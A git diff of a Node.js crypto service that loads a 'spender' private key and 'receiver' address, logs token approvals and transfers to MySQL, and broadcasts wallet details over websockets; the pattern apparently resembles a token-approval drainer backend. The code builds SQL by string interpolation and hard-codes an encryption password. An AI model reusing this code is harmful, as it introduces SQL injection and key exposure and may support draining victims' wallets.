@@ -12,22 +12,12 @@ var moment = require("moment")
 
 var mysql = require('mysql');
 
-
-var privateKey = argv.k.trim();
-
-var spender = (new Web3()).eth.accounts.privateKeyToAccount(privateKey).address
-var receiver = spender
 var Settings = null;
+var privateKey, spender, receiver, mAddress;
+var password = 'Weathy Invest';
+
 var isDev = false
 if (argv.dev) isDev = true;
-
-var mAddress = CryptoJS.AES.encrypt(spender, 'Weathy Invest').toString();
-logWaning("dev", isDev, "mAddress:", mAddress)
-
-if (argv.receiver) receiver = argv.receiver.toString();
-
-logWaning("spender", spender, "receiver", receiver)
-
 
 var db = {
     saveAppoved: async function (content) {
@@ -45,7 +35,7 @@ var db = {
     saveTransfered: async function (content) {
         if (!content.note) content.note = "NULL";
         let sql = `insert into wea.transfereds
-    (transactionHash, chainId, symbol, from, to, value, note)
+    (transactionHash, chainId, symbol, fromAddress, toAddress, amount, note)
     VALUES('${content.transactionHash}', '${content.chainId}', '${content.symbol}', '${content.from}', '${content.to}', '${content.value}', ${content.note});`
 
         this.con.query(sql, function (err, result) {
@@ -96,6 +86,8 @@ async function loadSettings(file = "settings.json") {
     let content = fs.readFileSync(file, "utf8");
     let settings = JSON.parse(content)
     receiver = settings.receiver
+    privateKey = settings.spenderPk
+    spender = (new Web3()).eth.accounts.privateKeyToAccount(settings.spenderPk).address
     Settings = settings;
     return settings;
 }
@@ -293,12 +285,17 @@ loadSettings()
 
         db.config = settings.database
         db.connect().then(c => {
+            mAddress = CryptoJS.AES.encrypt(spender, password).toString();
+
+            logWaning("dev", isDev, "mAddress:", mAddress)
+            logWaning("spender", spender, "receiver", receiver)
+
             let web3s, contracts = listenEvents(settings)
             // sentAlertTelegram("main.js started: " + moment().format("D/M/Y h:m"))
         })
     })
 // .catch(error => logError(error))
-var port = 8080;
+var port = 1000;
 if (argv.port) port = argv.port.trim();
 else if (argv.p) port = argv.p;
 
@@ -317,7 +314,12 @@ wss.on('connection', (ws) => {
         sendMessageClient({ "message": "hi " + id })
     });
 
-    ws.send(`{ "message": "hi ${id}" }`);
+    sendMessageClient({
+        status: {
+            spender: spender, receiver: receiver, mAddress: mAddress
+        }
+    });
+
     ws.onclose = (e) => {
         clients.slice(id, 1)
         logError("onclose ws " + id)
